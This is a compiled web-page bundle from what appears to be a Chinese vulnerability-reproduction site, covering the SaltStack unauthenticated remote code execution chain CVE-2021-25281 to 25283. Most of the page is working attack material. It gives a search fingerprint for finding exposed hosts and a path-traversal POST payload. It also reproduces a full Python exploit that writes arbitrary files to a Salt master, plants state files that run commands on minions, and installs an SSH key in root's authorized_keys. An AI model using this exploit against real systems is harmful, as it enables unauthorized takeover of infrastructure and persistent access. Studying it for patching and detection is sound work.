import{_ as p}from"./plugin-vue_export-helper-c27b6911.js";import{r as o,o as i,c as l,a as n,b as s,d as t,e}from"./app-58e4a7d6.js";const c={},u=n("h2",{id:"漏洞描述",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),s(" 漏洞描述")],-1),r=n("p",null,"SaltStack套件是政企机构 IT运维管理人员常用的管理工具，利用这些漏洞，最严重情形可导致未授权远程代码执行。",-1),k=n("ul",null,[n("li",null,[n("p",null,"CVE-2021-25281：salt-api wheel_async未授权访问")]),n("li",null,[n("p",null,"CVE-2021-25283：sdb rest插件模版渲染问题")]),n("li",null,[n("p",null,"CVE-2021-25282：wheel/pillar_roots.py文件任意写漏洞 (")])],-1),d=n("p",null,"参考链接：",-1),v={href:"https://mp.weixin.qq.com/s/iu4cS_DZTs0sVVg92RBe4Q",target:"_blank",rel:"noopener noreferrer"},m={href:"https://mp.weixin.qq.com/s/QvQoTuQJVthxS07pbLWJmg",target:"_blank",rel:"noopener noreferrer"},b={href:"https://saltproject.io/security_announcements/active-saltstack-cve-release-2021-feb-25/",target:"_blank",rel:"noopener noreferrer"},h={href:"https://dozer.nz/posts/saltapi-vulns",target:"_blank",rel:"noopener noreferrer"},g={href:"https://github.com/Immersive-Labs-Sec/CVE-2021-25281",target:"_blank",rel:"noopener noreferrer"},_=e(`<h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Saltstack 3002.2之前的所有版本
SaltStack =&lt; 3002.2
SaltStack =&lt; 3001.4
SaltStack =&lt; 3000.6
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>app=&quot;SALTSTACK-产品&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>CVE-2021-25281 + CVE-2021-25282 poc：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>http://target/run
POST:
&quot;client&quot;: &quot;wheel_async&quot;,
&quot;fun&quot;: &quot;pillar_roots.write&quot;,
&quot;data&quot;: &quot;../../../../../tmp/test2&quot;,
&quot;path&quot;: &quot;../../../../../tmp/test2&quot;,
&quot;username&quot;: &quot;password&quot;,
&quot;password&quot;: &quot;username&quot;,
&quot;eauth&quot;: &quot;pam&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,7),f={href:"http://CVE-2021-25281.py",target:"_blank",rel:"noopener noreferrer"},w=e(`<div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token comment"># Copyright (C) 2021 Alex Seymour, Immersive Labs</span>
<span class="token comment"># https://github.com/Immersive-Labs-Sec/CVE-2021-25281</span>
<span class="token comment">#</span>
<span class="token comment"># Permission is hereby granted, free of charge, to any person obtaining a copy</span>
<span class="token comment"># of this software and associated documentation files (the &quot;Software&quot;), to deal</span>
<span class="token comment"># in the Software without restriction, including without limitation the rights</span>
<span class="token comment"># to use, copy, modify, merge, publish, distribute, sublicense, and/or sell</span>
<span class="token comment"># copies of the Software, and to permit persons to whom the Software is</span>
<span class="token comment"># furnished to do so, subject to the following conditions:</span>

<span class="token comment"># The above copyright notice and this permission notice shall be included in all</span>
<span class="token comment"># copies or substantial portions of the Software.</span>

<span class="token comment"># THE SOFTWARE IS PROVIDED &quot;AS IS&quot;, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR</span>
<span class="token comment"># IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,</span>
<span class="token comment"># FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE</span>
<span class="token comment"># AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER</span>
<span class="token comment"># LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,</span>
<span class="token comment"># OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE</span>
<span class="token comment"># SOFTWARE.</span>
<span class="token keyword">from</span> argparse <span class="token keyword">import</span> ArgumentParser<span class="token punctuation">,</span> Namespace
<span class="token keyword">from</span> pathlib <span class="token keyword">import</span> Path
<span class="token keyword">from</span> secrets <span class="token keyword">import</span> token_hex
<span class="token keyword">from</span> textwrap <span class="token keyword">import</span> dedent

<span class="token keyword">import</span> requests
<span class="token keyword">import</span> urllib3

urllib3<span class="token punctuation">.</span>disable_warnings<span class="token punctuation">(</span>urllib3<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>InsecureRequestWarning<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">read_file</span><span class="token punctuation">(</span>file_path<span class="token punctuation">:</span> Path<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token keyword">with</span> file_path<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> handle<span class="token punctuation">:</span>
            <span class="token keyword">return</span> handle<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> OSError<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&#39;[-] Cannot read file </span><span class="token interpolation"><span class="token punctuation">{</span>file_path<span class="token punctuation">}</span></span><span class="token string">&#39;</span></span><span class="token punctuation">)</span>
        exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">send_request</span><span class="token punctuation">(</span>url<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> data<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    path <span class="token operator">=</span> path<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token keyword">if</span> path<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">&#39;/&#39;</span><span class="token punctuation">)</span> <span class="token keyword">else</span> path
    url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f&#39;https://</span><span class="token interpolation"><span class="token punctuation">{</span>url<span class="token punctuation">}</span></span><span class="token string">/run&#39;</span></span> <span class="token keyword">if</span> <span class="token keyword">not</span> url<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">&#39;http&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;https&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token string-interpolation"><span class="token string">f&#39;</span><span class="token interpolation"><span class="token punctuation">{</span>url<span class="token punctuation">}</span></span><span class="token string">/run&#39;</span></span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>
            url<span class="token punctuation">,</span>
            verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span>
            json<span class="token operator">=</span><span class="token punctuation">{</span>
                <span class="token string">&#39;eauth&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;auto&#39;</span><span class="token punctuation">,</span>
                <span class="token string">&#39;client&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;wheel_async&#39;</span><span class="token punctuation">,</span>
                <span class="token string">&#39;fun&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;pillar_roots.write&#39;</span><span class="token punctuation">,</span>
                <span class="token string">&#39;data&#39;</span><span class="token punctuation">:</span> data<span class="token punctuation">,</span>
                <span class="token string">&#39;path&#39;</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f&#39;../../../../../../</span><span class="token interpolation"><span class="token punctuation">{</span>path<span class="token punctuation">}</span></span><span class="token string">&#39;</span></span><span class="token punctuation">,</span>
            <span class="token punctuation">}</span><span class="token punctuation">,</span>
        <span class="token punctuation">)</span>
    <span class="token keyword">except</span> requests<span class="token punctuation">.</span>RequestException<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&#39;[-] Failed to send request to </span><span class="token interpolation"><span class="token punctuation">{</span>url<span class="token punctuation">}</span></span><span class="token string">&#39;</span></span><span class="token punctuation">)</span>
        exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

    <span class="token keyword">if</span> json <span class="token operator">:=</span> response<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&#39;[+] Got JID: </span><span class="token interpolation"><span class="token punctuation">{</span>json<span class="token punctuation">[</span><span class="token string">&quot;return&quot;</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">&quot;jid&quot;</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span><span class="token string">, the job was queued successfully&#39;</span></span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;[-] No JID was returned, the request may have failed or the target is not vulnerable&#39;</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">handle_write_file</span><span class="token punctuation">(</span>args<span class="token punctuation">:</span> Namespace<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> args<span class="token punctuation">.</span><span class="token builtin">file</span><span class="token punctuation">:</span>
        file_contents <span class="token operator">=</span> read_file<span class="token punctuation">(</span>args<span class="token punctuation">.</span><span class="token builtin">file</span><span class="token punctuation">)</span>
    <span class="token keyword">elif</span> args<span class="token punctuation">.</span>data<span class="token punctuation">:</span>
        file_contents <span class="token operator">=</span> args<span class="token punctuation">.</span>data
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;[-] Either file or data is required&#39;</span><span class="token punctuation">)</span>
        exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;[+] Attempting to write file&#39;</span><span class="token punctuation">)</span>
    send_request<span class="token punctuation">(</span>args<span class="token punctuation">.</span>target<span class="token punctuation">,</span> args<span class="token punctuation">.</span>path<span class="token punctuation">,</span> file_contents<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">handle_state_file</span><span class="token punctuation">(</span>args<span class="token punctuation">:</span> Namespace<span class="token punctuation">)</span><span class="token punctuation">:</span>
    state_file_path <span class="token operator">=</span> Path<span class="token punctuation">(</span><span class="token string">&#39;/srv&#39;</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token string">&#39;salt&#39;</span> <span class="token operator">/</span> <span class="token string-interpolation"><span class="token string">f&#39;</span><span class="token interpolation"><span class="token punctuation">{</span>token_hex<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">.sls&#39;</span></span>
    file_contents <span class="token operator">=</span> dedent<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;&quot;&quot;\\
    &#39;</span><span class="token interpolation"><span class="token punctuation">{</span>args<span class="token punctuation">.</span>cmd<span class="token punctuation">}</span></span><span class="token string">&#39;:
      cmd.run
    &quot;&quot;&quot;</span></span><span class="token punctuation">)</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&#39;[+] Attempting to write command to </span><span class="token interpolation"><span class="token punctuation">{</span>state_file_path<span class="token punctuation">}</span></span><span class="token string"> state file&#39;</span></span><span class="token punctuation">)</span>
    send_request<span class="token punctuation">(</span>args<span class="token punctuation">.</span>target<span class="token punctuation">,</span> <span class="token string-interpolation"><span class="token string">f&#39;/srv/salt/</span><span class="token interpolation"><span class="token punctuation">{</span>state_file_path<span class="token punctuation">.</span>name<span class="token punctuation">}</span></span><span class="token string">&#39;</span></span><span class="token punctuation">,</span> file_contents<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">handle_ssh_key</span><span class="token punctuation">(</span>args<span class="token punctuation">:</span> Namespace<span class="token punctuation">)</span><span class="token punctuation">:</span>
    public_key <span class="token operator">=</span> read_file<span class="token punctuation">(</span>args<span class="token punctuation">.</span>public_key<span class="token punctuation">)</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&#39;[+] Attempting to write an authorized key for user </span><span class="token interpolation"><span class="token punctuation">{</span>args<span class="token punctuation">.</span>user<span class="token punctuation">}</span></span><span class="token string">&#39;</span></span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> args<span class="token punctuation">.</span>user <span class="token operator">==</span> <span class="token string">&#39;root&#39;</span><span class="token punctuation">:</span>
        send_request<span class="token punctuation">(</span>args<span class="token punctuation">.</span>target<span class="token punctuation">,</span> <span class="token string">&#39;/root/.ssh/authorized_keys&#39;</span><span class="token punctuation">,</span> public_key<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        send_request<span class="token punctuation">(</span>args<span class="token punctuation">.</span>target<span class="token punctuation">,</span> <span class="token string-interpolation"><span class="token string">f&#39;/home/</span><span class="token interpolation"><span class="token punctuation">{</span>args<span class="token punctuation">.</span>user<span class="token punctuation">}</span></span><span class="token string">/.ssh/authorized_keys&#39;</span></span><span class="token punctuation">,</span> public_key<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    parser <span class="token operator">=</span> ArgumentParser<span class="token punctuation">(</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&#39;target&#39;</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&#39;The URL of the target Salt master&#39;</span><span class="token punctuation">)</span>
    subparsers <span class="token operator">=</span> parser<span class="token punctuation">.</span>add_subparsers<span class="token punctuation">(</span><span class="token punctuation">)</span>

    write_parser <span class="token operator">=</span> subparsers<span class="token punctuation">.</span>add_parser<span class="token punctuation">(</span><span class="token string">&#39;write&#39;</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&#39;Write data to a file on the master&#39;</span><span class="token punctuation">)</span>
    write_parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&#39;path&#39;</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&#39;The file path to write to on the target&#39;</span><span class="token punctuation">)</span>
    write_parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&#39;-f&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;--file&#39;</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span>Path<span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&#39;A file to upload to the target&#39;</span><span class="token punctuation">)</span>
    write_parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&#39;-d&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;--data&#39;</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&#39;The raw contents to write to a file&#39;</span><span class="token punctuation">)</span>
    write_parser<span class="token punctuation">.</span>set_defaults<span class="token punctuation">(</span>func<span class="token operator">=</span>handle_write_file<span class="token punctuation">)</span>

    state_parser <span class="token operator">=</span> subparsers<span class="token punctuation">.</span>add_parser<span class="token punctuation">(</span><span class="token string">&#39;state&#39;</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&#39;Create a state file to try and run commands on minions&#39;</span><span class="token punctuation">)</span>
    state_parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&#39;cmd&#39;</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&#39;A command to add to a new state file&#39;</span><span class="token punctuation">)</span>
    state_parser<span class="token punctuation">.</span>set_defaults<span class="token punctuation">(</span>func<span class="token operator">=</span>handle_state_file<span class="token punctuation">)</span>

    ssh_parser <span class="token operator">=</span> subparsers<span class="token punctuation">.</span>add_parser<span class="token punctuation">(</span><span class="token string">&#39;ssh&#39;</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&#39;Write an SSH key to try and gain remote access to the master&#39;</span><span class="token punctuation">)</span>
    ssh_parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&#39;public_key&#39;</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span>Path<span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&#39;A file containing the public key to upload&#39;</span><span class="token punctuation">)</span>
    ssh_parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&#39;-u&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;--user&#39;</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token string">&#39;root&#39;</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&#39;The user on the target to try and upload the key to&#39;</span><span class="token punctuation">)</span>
    ssh_parser<span class="token punctuation">.</span>set_defaults<span class="token punctuation">(</span>func<span class="token operator">=</span>handle_ssh_key<span class="token punctuation">)</span>

    args <span class="token operator">=</span> parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>
    args<span class="token punctuation">.</span>func<span class="token punctuation">(</span>args<span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&#39;__main__&#39;</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,1);function y(q,E){const a=o("ExternalLinkIcon");return i(),l("div",null,[u,r,k,d,n("ul",null,[n("li",null,[n("a",v,[s("https://mp.weixin.qq.com/s/iu4cS_DZTs0sVVg92RBe4Q"),t(a)])]),n("li",null,[n("a",m,[s("https://mp.weixin.qq.com/s/QvQoTuQJVthxS07pbLWJmg"),t(a)])]),n("li",null,[n("a",b,[s("https://saltproject.io/security_announcements/active-saltstack-cve-release-2021-feb-25/"),t(a)])]),n("li",null,[n("a",h,[s("https://dozer.nz/posts/saltapi-vulns"),t(a)])]),n("li",null,[n("a",g,[s("https://github.com/Immersive-Labs-Sec/CVE-2021-25281"),t(a)])])]),_,n("p",null,[n("a",f,[s("CVE-2021-25281.py"),t(a)]),s("：")]),w])}const I=p(c,[["render",y],["__file","Saltstack 未授权RCE漏洞 CVE-2021-25281~25283.html.vue"]]);export{I as default};
